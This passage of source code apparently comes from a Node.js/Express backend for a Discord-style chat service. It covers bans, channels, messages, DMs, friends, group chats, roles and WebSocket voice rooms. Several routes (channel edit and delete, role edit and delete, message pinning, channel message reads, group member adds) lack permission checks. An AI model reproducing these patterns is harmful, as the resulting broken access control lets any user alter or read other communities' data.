  const isServerOwner = s.owner_id === req.user.id;
  const globalOwner = isOwner(req.user.username);
  if (!isServerOwner && !globalOwner) return res.status(403).json({ error: 'Only server owner can kick members' });
  // Cannot kick global owners
  const target = db.prepare('SELECT * FROM users WHERE id=?').get(userId);
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (isOwner(target.username)) return res.status(400).json({ error: 'Cannot kick an owner' });
  db.prepare('DELETE FROM server_members WHERE server_id=? AND user_id=?').run(req.params.id, userId);
  sendToUser(userId, { type: 'SERVER_KICKED', serverId: req.params.id, serverName: s.name });
  broadcast(req.params.id, { type: 'MEMBER_LEAVE', serverId: req.params.id, userId });
  logActivity('SERVER_KICK', target.username, userId, '', `Kicked from "${s.name}" by ${req.user.username}`);
  res.json({ ok: true });
});

// Server-ban a member
app.post('/api/servers/:id/ban', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const { userId, reason } = req.body;
  const isServerOwner = s.owner_id === req.user.id;
  const globalOwner = isOwner(req.user.username);
  if (!isServerOwner && !globalOwner) return res.status(403).json({ error: 'Only server owner can ban members' });
  const target = db.prepare('SELECT * FROM users WHERE id=?').get(userId);
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (isOwner(target.username)) return res.status(400).json({ error: 'Cannot ban an owner' });
  db.prepare('DELETE FROM server_members WHERE server_id=? AND user_id=?').run(req.params.id, userId);
  db.prepare('INSERT OR REPLACE INTO server_bans(id,server_id,user_id,banned_by,reason) VALUES(?,?,?,?,?)').run(uuidv4(), req.params.id, userId, req.user.id, reason || 'No reason');
  sendToUser(userId, { type: 'SERVER_BANNED', serverId: req.params.id, serverName: s.name, reason: reason || 'No reason' });
  broadcast(req.params.id, { type: 'MEMBER_LEAVE', serverId: req.params.id, userId });
  logActivity('SERVER_BAN', target.username, userId, '', `Banned from "${s.name}" by ${req.user.username} — ${reason || 'No reason'}`);
  res.json({ ok: true });
});

// Check if banned from server (on join)
app.post('/api/servers/:id/join', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const banned = db.prepare('SELECT * FROM server_bans WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (banned) return res.status(403).json({ error: 'You are banned from this server' });
  db.prepare('INSERT OR IGNORE INTO server_members(server_id,user_id) VALUES(?,?)').run(req.params.id, req.user.id);
  const srv = ss(s, req.user.id);
  sendToUser(req.user.id, { type: 'SERVER_JOINED', server: srv });
  broadcast(req.params.id, { type: 'MEMBER_JOIN', serverId: req.params.id, userId: req.user.id });
  res.json(srv);
});

// Get server ban list
app.get('/api/servers/:id/bans', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  if (s.owner_id !== req.user.id && !isOwner(req.user.username)) return res.status(403).json({ error: 'Forbidden' });
  const bans = db.prepare('SELECT sb.*,u.username,u.display_name FROM server_bans sb JOIN users u ON sb.user_id=u.id WHERE sb.server_id=?').all(req.params.id);
  res.json(bans);
});

// Unban from server
app.delete('/api/servers/:id/bans/:uid', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  if (s.owner_id !== req.user.id && !isOwner(req.user.username)) return res.status(403).json({ error: 'Forbidden' });
  db.prepare('DELETE FROM server_bans WHERE server_id=? AND user_id=?').run(req.params.id, req.params.uid);
  res.json({ ok: true });
});
app.get('/api/invite/:id', (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  res.json({ serverId: s.id, name: s.name, icon: s.icon, iconEmoji: s.icon_emoji, description: s.description, memberCount: db.prepare('SELECT COUNT(*) as c FROM server_members WHERE server_id=?').get(s.id).c });
});

// ── CHANNELS ──────────────────────────────────────────────────────
app.post('/api/servers/:sid/channels', auth, (req, res) => {
  const { name, type, topic } = req.body;
  if (!name?.trim()) return res.status(400).json({ error: 'Name required' });
  const id = uuidv4(), pos = (db.prepare('SELECT MAX(position) as m FROM channels WHERE server_id=?').get(req.params.sid).m || 0) + 1;
  db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(id, req.params.sid, name.trim(), type || 'text', topic || '', pos);
  const ch = { id, name: name.trim(), type: type || 'text', topic: topic || '', position: pos };
  broadcast(req.params.sid, { type: 'CHANNEL_CREATE', serverId: req.params.sid, channel: ch });
  res.json(ch);
});
app.patch('/api/channels/:id', auth, (req, res) => {
  const { name, topic } = req.body;
  if (name) db.prepare('UPDATE channels SET name=? WHERE id=?').run(name, req.params.id);
  if (topic !== undefined) db.prepare('UPDATE channels SET topic=? WHERE id=?').run(topic, req.params.id);
  res.json({ ok: true });
});
app.delete('/api/channels/:id', auth, (req, res) => {
  const ch = db.prepare('SELECT * FROM channels WHERE id=?').get(req.params.id);
  if (!ch) return res.status(404).json({ error: 'Not found' });
  db.prepare('DELETE FROM channels WHERE id=?').run(req.params.id);
  broadcast(ch.server_id, { type: 'CHANNEL_DELETE', serverId: ch.server_id, channelId: req.params.id });
  res.json({ ok: true });
});

// ── MESSAGES ──────────────────────────────────────────────────────
app.get('/api/channels/:id/messages', auth, (req, res) => {
  const { before, limit = 60 } = req.query;
  let q = 'SELECT * FROM messages WHERE channel_id=?';
  const p = [req.params.id];
  if (before) { q += ' AND created_at<?'; p.push(before); }
  q += ' ORDER BY created_at DESC LIMIT ?'; p.push(parseInt(limit));
  res.json(db.prepare(q).all(...p).reverse().map(smsg));
});
app.post('/api/channels/:id/messages', auth, upload.single('attachment'), (req, res) => {
  const { content, replyTo } = req.body;
  if (!content?.trim() && !req.file) return res.status(400).json({ error: 'Empty' });
  const id = uuidv4(), ts = Date.now();
  const attUrl = req.file ? '/uploads/' + req.file.filename : null;
  const attType = req.file ? req.file.mimetype : null;
  const attName = req.file ? req.file.originalname : null;
  const attSize = req.file ? req.file.size : null;
  db.prepare('INSERT INTO messages(id,channel_id,author_id,content,attachment_url,attachment_type,attachment_name,attachment_size,reply_to,created_at) VALUES(?,?,?,?,?,?,?,?,?,?)').run(id, req.params.id, req.user.id, (content || '').trim(), attUrl, attType, attName, attSize, replyTo || null, ts);
  const ch = db.prepare('SELECT server_id FROM channels WHERE id=?').get(req.params.id);
  const msg = smsg(db.prepare('SELECT * FROM messages WHERE id=?').get(id));
  broadcast(ch?.server_id, { type: 'MESSAGE_CREATE', message: msg });
  res.json(msg);
});
app.patch('/api/messages/:id', auth, (req, res) => {
  const msg = db.prepare('SELECT * FROM messages WHERE id=? AND author_id=?').get(req.params.id, req.user.id);
  if (!msg) return res.status(403).json({ error: 'Forbidden' });
  db.prepare('UPDATE messages SET content=?,edited=1 WHERE id=?').run(req.body.content, req.params.id);
  const ch = db.prepare('SELECT server_id FROM channels WHERE id=?').get(msg.channel_id);
  broadcast(ch?.server_id, { type: 'MESSAGE_UPDATE', messageId: req.params.id, channelId: msg.channel_id, content: req.body.content });
  res.json({ ok: true });
});
app.delete('/api/messages/:id', auth, (req, res) => {
  const msg = db.prepare('SELECT m.*,c.server_id FROM messages m JOIN channels c ON m.channel_id=c.id WHERE m.id=?').get(req.params.id);
  if (!msg) return res.status(404).json({ error: 'Not found' });
  const isMod = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(msg.server_id, req.user.id)?.role === 'admin';
  if (msg.author_id !== req.user.id && !isMod && !isAdm(req.user.username)) return res.status(403).json({ error: 'Forbidden' });
  db.prepare('DELETE FROM messages WHERE id=?').run(req.params.id);
  db.prepare('DELETE FROM reactions WHERE message_id=?').run(req.params.id);
  broadcast(msg.server_id, { type: 'MESSAGE_DELETE', messageId: req.params.id, channelId: msg.channel_id });
  res.json({ ok: true });
});
app.post('/api/messages/:id/pin', auth, (req, res) => {
  const msg = db.prepare('SELECT m.*,c.server_id FROM messages m JOIN channels c ON m.channel_id=c.id WHERE m.id=?').get(req.params.id);
  if (!msg) return res.status(404).json({ error: 'Not found' });
  const pinned = !msg.pinned;
  db.prepare('UPDATE messages SET pinned=? WHERE id=?').run(pinned ? 1 : 0, req.params.id);
  broadcast(msg.server_id, { type: 'MESSAGE_PIN', messageId: req.params.id, channelId: msg.channel_id, pinned });
  res.json({ ok: true });
});
app.post('/api/messages/:id/react', auth, (req, res) => {
  const { emoji } = req.body;
  const ex = db.prepare('SELECT * FROM reactions WHERE message_id=? AND user_id=? AND emoji=?').get(req.params.id, req.user.id, emoji);
  if (ex) db.prepare('DELETE FROM reactions WHERE message_id=? AND user_id=? AND emoji=?').run(req.params.id, req.user.id, emoji);
  else db.prepare('INSERT INTO reactions(message_id,user_id,emoji) VALUES(?,?,?)').run(req.params.id, req.user.id, emoji);
  const all = db.prepare('SELECT emoji,user_id FROM reactions WHERE message_id=?').all(req.params.id);
  const g = {}; all.forEach(r => { if (!g[r.emoji]) g[r.emoji] = []; g[r.emoji].push(r.user_id); });
  const ch = db.prepare('SELECT c.server_id FROM messages m JOIN channels c ON m.channel_id=c.id WHERE m.id=?').get(req.params.id);
  broadcast(ch?.server_id, { type: 'REACTION_UPDATE', messageId: req.params.id, reactions: g });
  res.json({ reactions: g });
});

// ── DMs ───────────────────────────────────────────────────────────
app.get('/api/dm/:uid', auth, (req, res) => {
  const msgs = db.prepare('SELECT * FROM direct_messages WHERE(from_user=? AND to_user=?)OR(from_user=? AND to_user=?) ORDER BY created_at ASC LIMIT 100').all(req.user.id, req.params.uid, req.params.uid, req.user.id);
  res.json(msgs.map(m => {
    const u = db.prepare('SELECT * FROM users WHERE id=?').get(m.from_user);
    return { id: m.id, authorId: m.from_user, authorName: u?.display_name || '?', authorAvatar: u?.avatar, authorAvatarEmoji: u?.avatar_emoji || '👤', authorNameFontUrl: u?.name_font_url, authorNameFontName: u?.name_font_name, content: m.content, attachmentUrl: m.attachment_url, attachmentType: m.attachment_type, attachmentName: m.attachment_name, timestamp: m.created_at, edited: !!m.edited };
  }));
});
app.post('/api/dm/:uid', auth, upload.single('attachment'), (req, res) => {
  const { content } = req.body;
  if (!content?.trim() && !req.file) return res.status(400).json({ error: 'Empty' });
  const id = uuidv4(), ts = Date.now();
  const attUrl = req.file ? '/uploads/' + req.file.filename : null;
  const attType = req.file ? req.file.mimetype : null;
  const attName = req.file ? req.file.originalname : null;
  db.prepare('INSERT INTO direct_messages(id,from_user,to_user,content,attachment_url,attachment_type,attachment_name,created_at) VALUES(?,?,?,?,?,?,?,?)').run(id, req.user.id, req.params.uid, (content || '').trim(), attUrl, attType, attName, ts);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  const msg = { id, authorId: req.user.id, authorName: u.display_name, authorAvatar: u.avatar, authorAvatarEmoji: u.avatar_emoji, authorNameFontUrl: u.name_font_url, authorNameFontName: u.name_font_name, content: (content || '').trim(), attachmentUrl: attUrl, attachmentType: attType, attachmentName: attName, timestamp: ts, edited: false };
  broadcastToUsers([req.user.id, req.params.uid], { type: 'DM_CREATE', toUserId: req.params.uid, fromUserId: req.user.id, message: msg });
  res.json(msg);
});

// ── FRIENDS ───────────────────────────────────────────────────────
app.get('/api/friends', auth, (req, res) => {
  const uid = req.user.id;
  const rows = db.prepare('SELECT f.*,u.id as uid,u.username,u.display_name,u.avatar,u.avatar_emoji,u.status,u.custom_status FROM friendships f JOIN users u ON(CASE WHEN f.requester_id=? THEN f.addressee_id ELSE f.requester_id END)=u.id WHERE f.requester_id=? OR f.addressee_id=? ORDER BY f.created_at DESC').all(uid, uid, uid);
  res.json(rows.map(f => ({ friendshipId: f.id, status: f.status, isRequester: f.requester_id === uid, user: { id: f.uid, username: f.username, displayName: f.display_name, avatar: f.avatar, avatarEmoji: f.avatar_emoji, status: f.status, customStatus: f.custom_status } })));
});
app.post('/api/friends/request', auth, (req, res) => {
  const { username } = req.body;
  const target = db.prepare('SELECT * FROM users WHERE username=?').get(username?.toLowerCase());
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (target.id === req.user.id) return res.status(400).json({ error: 'Cannot friend yourself' });
  const existing = db.prepare('SELECT * FROM friendships WHERE(requester_id=? AND addressee_id=?)OR(requester_id=? AND addressee_id=?)').get(req.user.id, target.id, target.id, req.user.id);
  if (existing?.status === 'accepted') return res.status(409).json({ error: 'Already friends' });
  if (existing?.status === 'pending') return res.status(409).json({ error: 'Request pending' });
  const id = uuidv4();
  db.prepare('INSERT INTO friendships(id,requester_id,addressee_id,status) VALUES(?,?,?,?)').run(id, req.user.id, target.id, 'pending');
  const me = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  sendToUser(target.id, { type: 'FRIEND_REQUEST', friendship: { friendshipId: id, status: 'pending', isRequester: false, user: su(me) } });
  res.json({ ok: true, friendshipId: id });
});
app.post('/api/friends/:id/accept', auth, (req, res) => {
  const f = db.prepare('SELECT * FROM friendships WHERE id=? AND addressee_id=?').get(req.params.id, req.user.id);
  if (!f) return res.status(404).json({ error: 'Not found' });
  db.prepare('UPDATE friendships SET status=? WHERE id=?').run('accepted', req.params.id);
  const me = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  sendToUser(f.requester_id, { type: 'FRIEND_ACCEPTED', user: su(me), friendshipId: req.params.id });
  res.json({ ok: true });
});
app.post('/api/friends/:id/decline', auth, (req, res) => {
  db.prepare('DELETE FROM friendships WHERE id=? AND(addressee_id=? OR requester_id=?)').run(req.params.id, req.user.id, req.user.id);
  res.json({ ok: true });
});
app.delete('/api/friends/:userId', auth, (req, res) => {
  db.prepare('DELETE FROM friendships WHERE(requester_id=? AND addressee_id=?)OR(requester_id=? AND addressee_id=?)').run(req.user.id, req.params.userId, req.params.userId, req.user.id);
  res.json({ ok: true });
});

// ── GROUP CHATS ───────────────────────────────────────────────────
// Get all groups the user is in
app.get('/api/groups', auth, (req, res) => {
  const groups = db.prepare('SELECT g.* FROM group_chats g JOIN group_members gm ON g.id=gm.group_id WHERE gm.user_id=? ORDER BY g.created_at DESC').all(req.user.id);
  res.json(groups.map(g => ({
    id: g.id, name: g.name, icon: g.icon, createdBy: g.created_by,
    members: db.prepare('SELECT u.id,u.username,u.display_name,u.avatar,u.avatar_emoji,u.status FROM group_members gm JOIN users u ON gm.user_id=u.id WHERE gm.group_id=?').all(g.id).map(u => ({ id: u.id, username: u.username, displayName: u.display_name, avatar: u.avatar, avatarEmoji: u.avatar_emoji, status: u.status })),
  })));
});

// Create a group
app.post('/api/groups', auth, (req, res) => {
  const { name, memberIds } = req.body;
  if (!name?.trim()) return res.status(400).json({ error: 'Group name required' });
  if (!memberIds || memberIds.length < 1) return res.status(400).json({ error: 'Add at least one member' });
  const id = uuidv4();
  db.prepare('INSERT INTO group_chats(id,name,created_by) VALUES(?,?,?)').run(id, name.trim(), req.user.id);
  // Add creator + all specified members
  const allIds = [req.user.id, ...memberIds.filter(uid => uid !== req.user.id)];
  allIds.forEach(uid => db.prepare('INSERT OR IGNORE INTO group_members(group_id,user_id) VALUES(?,?)').run(id, uid));
  const group = {
    id, name: name.trim(), icon: null, createdBy: req.user.id,
    members: allIds.map(uid => { const u = db.prepare('SELECT * FROM users WHERE id=?').get(uid); return u ? { id: u.id, username: u.username, displayName: u.display_name, avatar: u.avatar, avatarEmoji: u.avatar_emoji, status: u.status } : null; }).filter(Boolean),
  };
  // Notify all members
  allIds.forEach(uid => sendToUser(uid, { type: 'GROUP_CREATED', group }));
  res.json(group);
});

// Add member to group
app.post('/api/groups/:id/members', auth, (req, res) => {
  const g = db.prepare('SELECT * FROM group_chats WHERE id=?').get(req.params.id);
  if (!g) return res.status(404).json({ error: 'Group not found' });
  const { userId } = req.body;
  db.prepare('INSERT OR IGNORE INTO group_members(group_id,user_id) VALUES(?,?)').run(req.params.id, userId);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(userId);
  broadcastToGroup(req.params.id, { type: 'GROUP_MEMBER_ADD', groupId: req.params.id, user: u ? { id: u.id, username: u.username, displayName: u.display_name, avatar: u.avatar, avatarEmoji: u.avatar_emoji } : null });
  res.json({ ok: true });
});

// Remove member from group (owner only)
app.delete('/api/groups/:id/members/:uid', auth, (req, res) => {
  const g = db.prepare('SELECT * FROM group_chats WHERE id=?').get(req.params.id);
  if (!g) return res.status(404).json({ error: 'Group not found' });
  if (g.created_by !== req.user.id) return res.status(403).json({ error: 'Only group owner can remove members' });
  db.prepare('DELETE FROM group_members WHERE group_id=? AND user_id=?').run(req.params.id, req.params.uid);
  broadcastToGroup(req.params.id, { type: 'GROUP_MEMBER_LEAVE', groupId: req.params.id, userId: req.params.uid });
  res.json({ ok: true });
});

// Leave group
app.delete('/api/groups/:id/leave', auth, (req, res) => {
  db.prepare('DELETE FROM group_members WHERE group_id=? AND user_id=?').run(req.params.id, req.user.id);
  broadcastToGroup(req.params.id, { type: 'GROUP_MEMBER_LEAVE', groupId: req.params.id, userId: req.user.id });
  res.json({ ok: true });
});

// Get group messages
app.get('/api/groups/:id/messages', auth, (req, res) => {
  const mem = db.prepare('SELECT * FROM group_members WHERE group_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem) return res.status(403).json({ error: 'Not a member' });
  const msgs = db.prepare('SELECT * FROM group_messages WHERE group_id=? ORDER BY created_at ASC LIMIT 100').all(req.params.id);
  res.json(msgs.map(m => {
    const u = db.prepare('SELECT * FROM users WHERE id=?').get(m.author_id);
    return { id: m.id, groupId: m.group_id, authorId: m.author_id, authorName: u?.display_name || '?', authorAvatar: u?.avatar, authorAvatarEmoji: u?.avatar_emoji || '👤', content: m.content, attachmentUrl: m.attachment_url, attachmentType: m.attachment_type, attachmentName: m.attachment_name, timestamp: m.created_at, edited: !!m.edited };
  }));
});

// Send group message
app.post('/api/groups/:id/messages', auth, upload.single('attachment'), (req, res) => {
  const mem = db.prepare('SELECT * FROM group_members WHERE group_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem) return res.status(403).json({ error: 'Not a member' });
  const { content } = req.body;
  if (!content?.trim() && !req.file) return res.status(400).json({ error: 'Empty' });
  const id = uuidv4(), ts = Date.now();
  const attUrl = req.file ? '/uploads/' + req.file.filename : null;
  const attType = req.file ? req.file.mimetype : null;
  const attName = req.file ? req.file.originalname : null;
  db.prepare('INSERT INTO group_messages(id,group_id,author_id,content,attachment_url,attachment_type,attachment_name,created_at) VALUES(?,?,?,?,?,?,?,?)').run(id, req.params.id, req.user.id, (content || '').trim(), attUrl, attType, attName, ts);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  const msg = { id, groupId: req.params.id, authorId: req.user.id, authorName: u.display_name, authorAvatar: u.avatar, authorAvatarEmoji: u.avatar_emoji, content: (content || '').trim(), attachmentUrl: attUrl, attachmentType: attType, attachmentName: attName, timestamp: ts, edited: false };
  broadcastToGroup(req.params.id, { type: 'GROUP_MESSAGE', message: msg });
  res.json(msg);
});

function broadcastToGroup(groupId, data) {
  const members = db.prepare('SELECT user_id FROM group_members WHERE group_id=?').all(groupId);
  broadcastToUsers(members.map(m => m.user_id), data);
}

// ── ANNOUNCEMENTS ─────────────────────────────────────────────────
app.post('/api/admin/announce', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { text, durationMinutes } = req.body;
  if (!text?.trim()) return res.status(400).json({ error: 'Text required' });
  db.prepare('UPDATE announcements SET active=0').run();
  const exp = durationMinutes ? Math.floor(Date.now()/1000) + (parseInt(durationMinutes)*60) : null;
  const id = uuidv4();
  db.prepare('INSERT INTO announcements(id,text,created_by,expires_at,active) VALUES(?,?,?,?,1)').run(id, text.trim(), req.user.username, exp);
  const ann = { id, text: text.trim(), createdBy: req.user.username, expiresAt: exp };
  broadcast(null, { type: 'ANNOUNCEMENT', announcement: ann });
  res.json({ ok: true, announcement: ann });
});
app.delete('/api/admin/announce', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  db.prepare('UPDATE announcements SET active=0').run();
  broadcast(null, { type: 'ANNOUNCEMENT_CLEAR' });
  res.json({ ok: true });
});
app.get('/api/announce/active', (req, res) => {
  // Clean up expired ones first
  db.prepare('UPDATE announcements SET active=0 WHERE active=1 AND expires_at IS NOT NULL AND expires_at < ?').run(Math.floor(Date.now()/1000));
  const a = db.prepare('SELECT * FROM announcements WHERE active=1 ORDER BY created_at DESC LIMIT 1').get();
  if (!a) return res.json(null);
  res.json(a);
});

// ── ROLES ──────────────────────────────────────────────────────────
app.get('/api/servers/:id/roles', auth, (req, res) => {
  res.json(db.prepare('SELECT * FROM roles WHERE server_id=? ORDER BY position DESC').all(req.params.id));
});
app.post('/api/servers/:id/roles', auth, (req, res) => {
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem || mem.role !== 'admin') return res.status(403).json({ error: 'Not admin' });
  const { name, color, permissions } = req.body;
  if (!name?.trim()) return res.status(400).json({ error: 'Name required' });
  const id = uuidv4();
  const pos = (db.prepare('SELECT MAX(position) as m FROM roles WHERE server_id=?').get(req.params.id).m || 0) + 1;
  db.prepare('INSERT INTO roles(id,server_id,name,color,permissions,position) VALUES(?,?,?,?,?,?)').run(id, req.params.id, name.trim(), color||'#5b8df8', JSON.stringify(permissions||{}), pos);
  const role = { id, serverId: req.params.id, name: name.trim(), color: color||'#5b8df8', permissions: permissions||{}, position: pos };
  broadcast(req.params.id, { type: 'ROLE_CREATE', role });
  res.json(role);
});
app.patch('/api/roles/:id', auth, (req, res) => {
  const role = db.prepare('SELECT * FROM roles WHERE id=?').get(req.params.id);
  if (!role) return res.status(404).json({ error: 'Not found' });
  const { name, color, permissions } = req.body;
  if (name) db.prepare('UPDATE roles SET name=? WHERE id=?').run(name, req.params.id);
  if (color) db.prepare('UPDATE roles SET color=? WHERE id=?').run(color, req.params.id);
  if (permissions) db.prepare('UPDATE roles SET permissions=? WHERE id=?').run(JSON.stringify(permissions), req.params.id);
  const updated = db.prepare('SELECT * FROM roles WHERE id=?').get(req.params.id);
  broadcast(role.server_id, { type: 'ROLE_UPDATE', role: updated });
  res.json(updated);
});
app.delete('/api/roles/:id', auth, (req, res) => {
  const role = db.prepare('SELECT * FROM roles WHERE id=?').get(req.params.id);
  if (!role) return res.status(404).json({ error: 'Not found' });
  db.prepare('DELETE FROM roles WHERE id=?').run(req.params.id);
  db.prepare('DELETE FROM member_roles WHERE role_id=?').run(req.params.id);
  broadcast(role.server_id, { type: 'ROLE_DELETE', roleId: req.params.id });
  res.json({ ok: true });
});
app.post('/api/servers/:id/members/:uid/roles', auth, (req, res) => {
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem || mem.role !== 'admin') return res.status(403).json({ error: 'Not admin' });
  const { roleId, remove } = req.body;
  if (remove) db.prepare('DELETE FROM member_roles WHERE user_id=? AND role_id=? AND server_id=?').run(req.params.uid, roleId, req.params.id);
  else db.prepare('INSERT OR IGNORE INTO member_roles(user_id,role_id,server_id) VALUES(?,?,?)').run(req.params.uid, roleId, req.params.id);
  broadcast(req.params.id, { type: 'MEMBER_ROLE_UPDATE', serverId: req.params.id, userId: req.params.uid });
  res.json({ ok: true });
});

// ── PREMADE SERVER ICONS ───────────────────────────────────────────
app.get('/api/premade-icons', auth, (req, res) => {
  res.json(db.prepare('SELECT * FROM premade_icons ORDER BY created_at DESC').all());
});
app.post('/api/admin/premade-icons', auth, upload.single('image'), (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  const id = uuidv4();
  const name = req.body.name || req.file.originalname.replace(/\.[^.]+$/,'');
  db.prepare('INSERT INTO premade_icons(id,url,name,uploaded_by) VALUES(?,?,?,?)').run(id, url, name, req.user.username);
  broadcast(null, { type: 'PREMADE_ICON_ADD', icon: { id, url, name } });
  res.json({ id, url, name });
});
app.delete('/api/admin/premade-icons/:id', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  db.prepare('DELETE FROM premade_icons WHERE id=?').run(req.params.id);
  broadcast(null, { type: 'PREMADE_ICON_REMOVE', iconId: req.params.id });
  res.json({ ok: true });
});

// Allow any server member to set server icon (picture or premade)
app.post('/api/servers/:id/icon', auth, upload.single('image'), (req, res) => {
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem) return res.status(403).json({ error: 'Not a member' });
  // premadeUrl = pick from premade list, otherwise upload
  const url = req.body.premadeUrl || (req.file ? '/uploads/' + req.file.filename : null);
  if (!url) return res.status(400).json({ error: 'No icon provided' });
  db.prepare('UPDATE servers SET icon=?,icon_emoji=NULL WHERE id=?').run(url, req.params.id);
  const srv = ss(db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id), req.user.id);
  broadcast(null, { type: 'SERVER_UPDATE', server: srv });
  res.json({ url });
});

// ── SOUNDBOARD ────────────────────────────────────────────────────
app.post('/api/admin/upload-thug', auth, upload.single('video'), (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const dest = path.join(__dirname, 'public', 'thug.mp4');
  fs.renameSync(req.file.path, dest);
  res.json({ ok: true });
});

app.post('/api/soundboard/upload', auth, upload.single('sound'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  res.json({ url, name: req.body.name || req.file.originalname.replace(/\.[^.]+$/, '') });
});

// ── WS ────────────────────────────────────────────────────────────
const userSockets = new Map(), wsUsers = new Map(), voiceRooms = new Map();

function broadcast(sid, data) {
  const msg = JSON.stringify(data);
  if (sid) {
    db.prepare('SELECT user_id FROM server_members WHERE server_id=?').all(sid).forEach(m => {
      const s = userSockets.get(m.user_id); if (s) s.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
    });
  } else { wss.clients.forEach(ws => { if (ws.readyState === 1) ws.send(msg); }); }
}
function broadcastToUsers(uids, data) {
  const msg = JSON.stringify(data);
  uids.forEach(uid => { const s = userSockets.get(uid); if (s) s.forEach(ws => { if (ws.readyState === 1) ws.send(msg); }); });
}
function sendToUser(uid, data) {
  const msg = JSON.stringify(data);
  const s = userSockets.get(uid); if (s) s.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
}
function getVCP(cid) {
  const r = voiceRooms.get(cid); if (!r) return [];
  return Array.from(r.entries()).map(([uid, st]) => {
    const u = db.prepare('SELECT * FROM users WHERE id=?').get(uid);
    return { userId: uid, displayName: u?.display_name || '?', avatar: u?.avatar, avatarEmoji: u?.avatar_emoji || '👤', ...st };
  });
}

wss.on('connection', (ws, req) => {
  const c = req.headers.cookie || '', m = c.match(/mc_sess=([^;]+)/);
  if (!m) return ws.close();
  const sess = db.prepare('SELECT * FROM sessions WHERE id=? AND expires_at>unixepoch()').get(m[1]);
  if (!sess) return ws.close();
  const userId = sess.user_id;
  const ban = _chkBan(userId);
  if (ban) { ws.send(JSON.stringify({ type: 'BANNED', reason: ban.reason, expiresAt: ban.expires_at })); ws.close(); return; }
  wsUsers.set(ws, userId);
  if (!userSockets.has(userId)) userSockets.set(userId, new Set());
  userSockets.get(userId).add(ws);
  db.prepare('UPDATE users SET status=? WHERE id=?').run('online', userId);
  broadcast(null, { type: 'USER_STATUS', userId, status: 'online' });

  // Send all current voice room states to new connection
  voiceRooms.forEach((room, chId) => {
    if (!room.size) return;
    const ch = db.prepare('SELECT server_id FROM channels WHERE id=?').get(chId);
    ws.send(JSON.stringify({ type: 'VOICE_ROOM_UPDATE', channelId: chId, serverId: ch?.server_id, participants: getVCP(chId) }));
  });
  // Send active announcement
  const activeAnn = db.prepare('SELECT * FROM announcements WHERE active=1 ORDER BY created_at DESC LIMIT 1').get();
  if (activeAnn && (!activeAnn.expires_at || activeAnn.expires_at > Math.floor(Date.now()/1000))) {
    ws.send(JSON.stringify({ type: 'ANNOUNCEMENT', announcement: activeAnn }));
  }

  ws.on('message', raw => {
    try {
      const d = JSON.parse(raw), uid = wsUsers.get(ws); if (!uid) return;
      switch (d.type) {
        case 'TYPING': {
          const u = db.prepare('SELECT display_name FROM users WHERE id=?').get(uid);
          broadcast(d.serverId, { type: 'TYPING', channelId: d.channelId, userId: uid, displayName: u?.display_name });
          break;
        }
        case 'SOUNDBOARD_PLAY':
          broadcast(d.serverId, { type: 'SOUNDBOARD_PLAY', url: d.url, name: d.name, userId: uid });
          break;
        case 'VOICE_JOIN': {
          voiceRooms.forEach((room, chId) => {
            if (room.has(uid)) { room.delete(uid); const sv = db.prepare('SELECT server_id FROM channels WHERE id=?').get(chId); broadcast(null, { type: 'VOICE_LEAVE', channelId: chId, userId: uid, serverId: sv?.server_id }); broadcast(null, { type: 'VOICE_ROOM_UPDATE', channelId: chId, serverId: sv?.server_id, participants: getVCP(chId) }); }
          });
          if (!voiceRooms.has(d.channelId)) voiceRooms.set(d.channelId, new Map());
          const room = voiceRooms.get(d.channelId), existing = Array.from(room.keys());
          room.set(uid, { muted: false, deafened: false, screensharing: false, video: false, quality: d.quality || '720p' });
          existing.forEach(eUid => { sendToUser(eUid, { type: 'RTC_USER_JOINED', channelId: d.channelId, userId: uid }); sendToUser(uid, { type: 'RTC_SEND_OFFER', channelId: d.channelId, targetUserId: eUid }); });
          broadcast(null, { type: 'VOICE_JOIN', channelId: d.channelId, userId: uid, serverId: d.serverId });
